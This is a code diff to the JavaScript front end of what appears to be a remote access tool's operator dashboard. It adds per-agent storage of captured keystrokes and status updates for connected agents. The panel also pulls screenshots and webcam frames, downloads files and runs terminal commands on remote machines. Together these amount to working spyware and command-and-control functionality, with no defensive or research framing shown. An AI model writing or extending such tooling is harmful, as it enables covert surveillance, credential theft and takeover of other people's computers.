@@ -245,6 +245,7 @@
 
         let currentTargetId = null;
         let connectedAgents = [];
+        let agentKeylogs = {}; // Store keylogs per agent
 
         // START Connection
         connection.start().then(function () {
@@ -295,6 +296,14 @@
             }
         });
 
+        connection.on("AgentStatusUpdate", function (agentId, status) {
+            let agent = connectedAgents.find(a => a.id === agentId);
+            if (agent) {
+                agent.status = status;
+                renderAgentList();
+            }
+        });
+
         // Background check for 60s timeout
         setInterval(function() {
             let now = Date.now();
@@ -325,10 +334,9 @@
                 const li = document.createElement("li");
                 li.className = "nav-item";
                 
-                // Show online status: < 30s = Online (success), > 30s = Away (warning)
-                let isAway = agent.lastHeartbeat && (now - agent.lastHeartbeat > 30000);
-                let badgeClass = isAway ? "bg-warning" : "bg-success";
-                let statusText = isAway ? "Away" : "Online";
+                // Show status: Connected, Keylogging, Webcam, etc.
+                let statusText = agent.status || "Connected";
+                let badgeClass = statusText === "Connected" ? "bg-success" : "bg-primary";
 
                 li.innerHTML = `<a class="nav-link ${agent.id === currentTargetId ? 'active' : ''}" href="#" onclick="selectAgent('${agent.id}', '${agent.name}')">
                     🖥️ ${agent.name} <span class="badge ${badgeClass} float-end">${statusText}</span>
@@ -344,11 +352,32 @@
             document.getElementById('control-panel').classList.remove('d-none');
             renderAgentList(); // To update active class
             
-            // Tự động yêu cầu danh sách Webcam khi vừa chọn máy mới
+            // Clear/reset old data from previous agent
+            document.getElementById("process-table-body").innerHTML = '<tr><td colspan="4" class="text-center text-muted">Select "Refresh Processes" to load</td></tr>';
+            document.getElementById("app-table-body").innerHTML = '<tr><td colspan="3" class="text-center text-muted">Select "Refresh Apps" to load</td></tr>';
+            
+            // Load keylog for this agent
+            if (!agentKeylogs[id]) {
+                agentKeylogs[id] = "> Keylogger not started yet...\n";
+            }
+            document.getElementById("keylog-console").textContent = agentKeylogs[id];
+            
+            document.getElementById("screenshot-img").src = "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' fill='%23EEEEEE'/%3E%3Ctext x='50%25' y='50%25' fill='%23555555' font-family='Arial' font-size='10' text-anchor='middle'%3ENo Screenshot%3C/text%3E%3C/svg%3E";
+            document.getElementById("webcam-img").src = "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' fill='%23EEEEEE'/%3E%3Ctext x='50%25' y='50%25' fill='%23555555' font-family='Arial' font-size='10' text-anchor='middle'%3ENo Webcam%3C/text%3E%3C/svg%3E";
+            document.getElementById("terminal-output").textContent = "> Terminal ready. Type commands below.\n";
+            document.getElementById("file-table-body").innerHTML = '<tr><td colspan="4" class="text-center text-muted">Select a drive/folder to browse</td></tr>';
+            document.getElementById("current-dir-path").value = "";
+            document.getElementById("file-download-status").textContent = "";
+            
+            // Auto-refresh data for new agent
+            getProcesses();
+            getApplications();
+            
+            // Automatically request Webcam list upon connecting to new Agent
             document.getElementById('webcam-select').innerHTML = '<option value="">Loading cameras...</option>';
             connection.invoke("RequestWebcams", currentTargetId).catch(err => console.error(err));
 
-            // Load danh sách ổ đĩa mặc định
+            // Load default drives list
             requestDirectoryContents("");
         }
 
@@ -360,6 +389,7 @@
         }
         
         connection.on("ReceiveProcesses", function(targetId, jsonArray) {
+            if (targetId !== currentTargetId) return;
             const processes = JSON.parse(jsonArray);
             const tbody = document.getElementById("process-table-body");
             tbody.innerHTML = "";
@@ -380,6 +410,7 @@
         }
 
         connection.on("ReceiveApplications", function(targetId, jsonArray) {
+            if (targetId !== currentTargetId) return;
             const apps = JSON.parse(jsonArray);
             const tbody = document.getElementById("app-table-body");
             tbody.innerHTML = "";
@@ -415,12 +446,14 @@
         }
 
         connection.on("ReceiveScreenshot", function(targetId, base64Image) {
+            if (targetId !== currentTargetId) return;
             if(base64Image) {
                 document.getElementById("screenshot-img").src = "data:image/jpeg;base64," + base64Image;
             }
         });
 
         connection.on("ReceiveWebcams", function(targetId, jsonArray) {
+            if (targetId !== currentTargetId) return;
             const cameras = JSON.parse(jsonArray);
             const selectEl = document.getElementById("webcam-select");
             selectEl.innerHTML = '<option value="">Default Camera</option>';
@@ -445,45 +478,59 @@
         }
         
         connection.on("ReceiveWebcamFrame", function(targetId, base64Image) {
+            if (targetId !== currentTargetId) return;
             if(base64Image) {
                 document.getElementById("webcam-img").src = "data:image/jpeg;base64," + base64Image;
             }
         });
         function startKeylogger() {
             if(!currentTargetId) return; 
-            document.getElementById("keylog-console").textContent = "> Keylogger started...\n";
+            // Don't clear console here, let ReceiveKeylog handle it
             connection.invoke("RequestStartKeylogger", currentTargetId).catch(err => console.error(err));
         }
 
         function stopKeylogger() {
             if(!currentTargetId) return; 
-            document.getElementById("keylog-console").textContent += "> Keylogger stopped.\n";
+            // Append to agent's keylog
+            if (!agentKeylogs[currentTargetId]) {
+                agentKeylogs[currentTargetId] = "";
+            }
+            agentKeylogs[currentTargetId] += "> Keylogger stopped.\n";
+            document.getElementById("keylog-console").textContent = agentKeylogs[currentTargetId];
             connection.invoke("RequestStopKeylogger", currentTargetId).catch(err => console.error(err));
         }
 
         connection.on("ReceiveKeylog", function(targetId, keys) {
-            const consoleEl = document.getElementById("keylog-console");
-            let currentText = consoleEl.textContent;
+            // Always store keylog for this agent
+            if (!agentKeylogs[targetId]) {
+                agentKeylogs[targetId] = "> Keylogger started...\n";
+            }
+            let agentText = agentKeylogs[targetId];
             
             for(let i = 0; i < keys.length; i++) {
                 if (keys[i] === '\b') {
-                    if (currentText.length > 0) {
-                        currentText = currentText.slice(0, -1);
+                    if (agentText.length > 0) {
+                        agentText = agentText.slice(0, -1);
                     }
                 } else {
-                    currentText += keys[i];
+                    agentText += keys[i];
                 }
             }
             
-            consoleEl.textContent = currentText;
-            consoleEl.scrollTop = consoleEl.scrollHeight; // Auto-scroll to bottom
+            agentKeylogs[targetId] = agentText;
+            
+            // Only update display if this is the current agent
+            if (targetId === currentTargetId) {
+                const consoleEl = document.getElementById("keylog-console");
+                consoleEl.textContent = agentText;
+                consoleEl.scrollTop = consoleEl.scrollHeight; // Auto-scroll to bottom
+            }
         });
 
         async function saveKeylog() {
-            const consoleEl = document.getElementById("keylog-console");
-            const textToSave = consoleEl.textContent;
-            if (!textToSave || textToSave.trim() === "> Awaiting key strokes...") {
-                alert("Không có gì để lưu!");
+            const textToSave = agentKeylogs[currentTargetId] || "";
+            if (!textToSave || textToSave.trim() === "> Keylogger not started yet..." || textToSave.trim() === "") {
+                alert("Nothing to save!");
                 return;
             }
 
@@ -507,10 +554,10 @@
                     document.body.removeChild(a);
                     window.URL.revokeObjectURL(url);
                 }
-                alert("Lưu file Keylog thành công!");
+                alert("Keylog saved successfully!");
             } catch (err) {
                 if (err.name !== 'AbortError') {
-                    alert("Lỗi khi lưu file: " + err.message);
+                    alert("Error saving file: " + err.message);
                 }
             }
         }
@@ -555,6 +602,7 @@
         }
 
         connection.on("ReceiveDirectoryContents", function(targetId, path, jsonStr) {
+            if (targetId !== currentTargetId) return;
             const isModal = activeExplorer === "modal";
             
             if (isModal) {
@@ -692,6 +740,7 @@
         }
         
         connection.on("ReceiveFile", async function(targetId, fileName, base64Data) {
+            if (targetId !== currentTargetId) return;
             document.getElementById("file-download-status").textContent = "File received: " + fileName + ". Waiting for save location...";
             
             try {
@@ -705,7 +754,7 @@
                 const blob = new Blob([byteArray], {type: "application/octet-stream"});
 
                 if (window.showSaveFilePicker) {
-                    // Mở hộp thoại "Save As" chuyên nghiệp (chỉ hỗ trợ trên Chrome/Edge/Opera đời mới)
+                    // Modern "Save As" dialog (supported on modern Chrome/Edge/Opera)
                     const opts = { suggestedName: fileName };
                     const handle = await window.showSaveFilePicker(opts);
                     const writable = await handle.createWritable();
@@ -713,7 +762,7 @@
                     await writable.close();
                     document.getElementById("file-download-status").textContent = "File saved successfully!";
                 } else {
-                    // Cách cổ điển: Tải thẳng vào thư mục Downloads cho các trình duyệt cũ
+                    // Classic fallback: Download directly to Downloads folder
                     const url = window.URL.createObjectURL(blob);
                     const a = document.createElement('a');
                     a.href = url;
@@ -768,6 +817,7 @@
         }
 
         connection.on("ReceiveTerminalOutput", function(targetId, output) {
+            if (targetId !== currentTargetId) return;
             const outEl = document.getElementById("terminal-output");
             outEl.textContent = outEl.textContent.replace("Running...", "");
             outEl.textContent += `\n${output}\n`;
